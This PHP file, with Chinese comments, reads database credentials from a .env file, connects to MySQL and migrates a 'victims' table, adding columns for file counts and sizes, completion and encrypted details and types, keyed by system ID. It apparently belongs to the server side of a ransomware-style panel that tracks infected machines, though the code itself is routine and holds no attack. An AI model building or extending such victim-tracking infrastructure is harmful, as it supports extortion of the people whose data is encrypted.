<?php
/**
 * 数据库连接 - 使用PDO预处理防SQL注入
 * 凭据从 .env 文件读取，不再硬编码
 */

// 解析 .env 文件
function loadEnv(string $path): void {
    if (!file_exists($path)) {
        die('Missing .env configuration file.');
    }
    foreach (file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        $line = trim($line);
        if ($line === '' || $line[0] === '#') continue;
        if (strpos($line, '=') === false) continue;
        [$key, $value] = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
    }
}

loadEnv(__DIR__ . '/../.env');

$db_host = $_ENV['DB_HOST'] ?? 'localhost';
$db_port = $_ENV['DB_PORT'] ?? '3306';
$db_name = $_ENV['DB_NAME'] ?? 'jasmin_db';
$db_user = $_ENV['DB_USER'] ?? 'jasminadmin';
$db_pass = $_ENV['DB_PASS'] ?? '';

try {
    $pdo = new PDO(
        "mysql:host={$db_host};port={$db_port};dbname={$db_name};charset=utf8mb4",
        $db_user,
        $db_pass,
        [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES   => false,
        ]
    );
} catch (PDOException $e) {
    error_log('Database connection failed: ' . $e->getMessage());
    if (php_sapi_name() === 'cli') { echo "Database connection error.\n"; exit(1); }
    die('Database connection error.');
}

/**
 * 幂等 schema 迁移：为 victim 表补齐进度条相关字段。
 * 用标记文件避免每请求都查 information_schema。
 */
$__schema_marker = __DIR__ . '/../.schema_v3';
if (!file_exists($__schema_marker)) {
    try {
        $hasCol = function (string $name) use ($pdo, $db_name): bool {
            $s = $pdo->prepare('SELECT COUNT(*) FROM information_schema.COLUMNS
                                WHERE TABLE_SCHEMA=:d AND TABLE_NAME=\'victims\' AND COLUMN_NAME=:c');
            $s->execute([':d' => $db_name, ':c' => $name]);
            return (int)$s->fetchColumn() > 0;
        };
        $alters = [
            'total_count'      => 'ALTER TABLE victims ADD COLUMN total_count int(11) NOT NULL DEFAULT 0',
            'total_size'       => 'ALTER TABLE victims ADD COLUMN total_size bigint(20) NOT NULL DEFAULT 0',
            'is_complete'      => 'ALTER TABLE victims ADD COLUMN is_complete tinyint(1) NOT NULL DEFAULT 1',
            'updated_at'       => 'ALTER TABLE victims ADD COLUMN updated_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP',
            'encrypted_detail' => 'ALTER TABLE victims ADD COLUMN encrypted_detail text DEFAULT NULL',
            'encrypted_types'  => 'ALTER TABLE victims ADD COLUMN encrypted_types text DEFAULT NULL',
        ];
        foreach ($alters as $colName => $sql) {
            if (!$hasCol($colName)) {
                try { $pdo->exec($sql); }
                catch (PDOException $e) { error_log("schema migrate [$colName]: " . $e->getMessage()); }
            }
        }
        // 旧表可能缺少 systemid 唯一键（upsert 依赖它）
        $s = $pdo->prepare('SELECT COUNT(*) FROM information_schema.STATISTICS
                            WHERE TABLE_SCHEMA=:d AND TABLE_NAME=\'victims\' AND INDEX_NAME=\'uniq_systemid\'');
        $s->execute([':d' => $db_name]);
        if ((int)$s->fetchColumn() === 0) {
            try { $pdo->exec('ALTER TABLE victims ADD UNIQUE KEY uniq_systemid (systemid)'); }
            catch (PDOException $e) { error_log('schema migrate [uniq_systemid]: ' . $e->getMessage()); }
        }
        @file_put_contents($__schema_marker, date('c'));
    } catch (PDOException $e) {
        error_log('schema migrate failed: ' . $e->getMessage());
    }
}
